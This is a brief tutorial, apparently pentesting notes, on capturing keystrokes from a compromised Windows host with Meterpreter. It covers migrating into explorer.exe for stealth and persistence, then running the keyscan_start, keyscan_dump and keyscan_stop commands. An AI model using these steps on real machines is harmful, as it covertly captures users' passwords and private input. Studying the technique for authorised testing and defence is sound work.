Keylogging is a powerful post-exploitation technique used to record every keystroke a user types. While it can be done with hardware (USB "rubber duckies") or standalone software, **Meterpreter** makes it seamless on Windows by running entirely in memory.

## 🏗️ Why Migrate to `explorer.exe`?

Before you start the keylogger, you must be in the right process. If your Meterpreter session is sitting in a background system process (like `svchost.exe`), it may not have access to the user's "input desktop."

**`explorer.exe`** is the best target because:

1. **It is Persistent:** It runs as long as the user is logged in.
    
2. **It is Interactive:** It owns the desktop interface where the user is actually typing.
    
3. **It is Stealthy:** It is a normal process that won't look suspicious in Task Manager.

### How to Migrate:

Bash

```
# Method 1: Manual search
ps                             # List all processes
migrate <PID_of_explorer>      # Move into Explorer

# Method 2: Fast search
pgrep explorer                 # Get the PID instantly
migrate <PID>
```

## 🛠️ The Keyscan Workflow

Once you have migrated into `explorer.exe`, you are ready to capture data.

### 1. Start the Capture

This starts a background thread that "sniffs" the keyboard.

Bash

```
keyscan_start
```

_Note: If successful, it will say "Starting the keystroke sniffer..."_

### 2. Dump the Captured Data

You can do this as many times as you want without stopping the sniffer. It will show you everything typed since the last dump.

Bash

```
keyscan_dump
```

### 3. Stop the Capture

When you are finished, always stop the sniffer to save system resources and lower your footprint.

Bash

```
keyscan_stop
```
